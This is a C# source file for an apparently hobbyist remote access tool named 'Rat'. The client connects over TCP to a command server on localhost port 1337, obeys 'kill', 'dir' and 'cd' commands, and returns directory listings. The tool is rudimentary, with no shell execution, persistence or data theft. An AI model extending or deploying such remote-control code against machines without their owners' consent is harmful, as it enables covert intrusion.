using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;

using da_box;

/** [ ] Messaage log query
 *  [ ] Connection retries
 */

namespace da_rat
{
    class Rat
    {
        private static ManualResetEvent _connectDone = new ManualResetEvent(false);

        private static byte[] _buffer = new byte[2048];
        private static Socket _clientSocket =
            new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        private static Box.Nav ToolBox = new Box.Nav();
        
        static void Main(string[] args)
        {
            Console.Title = "Rat";

            SetupClient();
            SendLoop();

            Console.WriteLine("Exiting...");
            Console.ReadLine();
        }

        private static void SetupClient(string home = "127.0.0.1", int port = 1337)
        {
            _clientSocket.BeginConnect(IPAddress.Parse(home), port
                , new AsyncCallback(ConnectCallback), _clientSocket);

            _connectDone.WaitOne();
        }

        private static void ConnectCallback(IAsyncResult AR)
        {
            try
            {
                Socket client = (Socket)AR.AsyncState;
                client.EndConnect(AR);

                Console.WriteLine("Socket connected to {0}",
                    client.RemoteEndPoint.ToString());

                client.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), client);

                _connectDone.Set();
            } catch (Exception)
            {
                System.Console.WriteLine("\n\nRetrying to connect...");
                Thread.Sleep(TimeSpan.FromSeconds(1));
            }
        }

        private static void ReceiveCallback(IAsyncResult AR)
        {
            Socket socket = (Socket)AR.AsyncState;

            try
            {
                int received = socket.EndReceive(AR);
                string response = "";

                byte[] dataBuf = new byte[received];
                Array.Copy(_buffer, dataBuf, received);


                string text = Encoding.ASCII.GetString(dataBuf);
                if (text == "kill") Environment.Exit(0);

                string[] textArr = text.Split();
                if  (textArr[0] == "dir")           response = ToolBox.Dir();
                else if (textArr[0] == "cd")
                    if (!ToolBox.Cd(textArr[1]))    response = "Invalid dir given...";

                if (!String.IsNullOrWhiteSpace(response))
                {
                    byte[] data = Encoding.ASCII.GetBytes(response);
                    socket.BeginSend(data, 0, data.Length, SocketFlags.None, new AsyncCallback(SendCallback), socket);
                }


                socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), socket);
            }
            catch (SocketException) { Console.WriteLine("Server disconnected..."); }
        }

        private static void SendCallback(IAsyncResult AR)
        {
            Socket socket = (Socket)AR.AsyncState;
            socket.EndSend(AR);
        }

        private static void SendLoop()
        {
            while(true)
            {
                Console.Write("> ");
                string req = Console.ReadLine().Trim();

                if (req == "break" || req == "exit")
                    break;

                byte[] buffer = Encoding.ASCII.GetBytes(req);
                _clientSocket.Send(buffer);

                _clientSocket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None,
                    new AsyncCallback(ReceiveCallback), _clientSocket);
            }
        }
    }
}
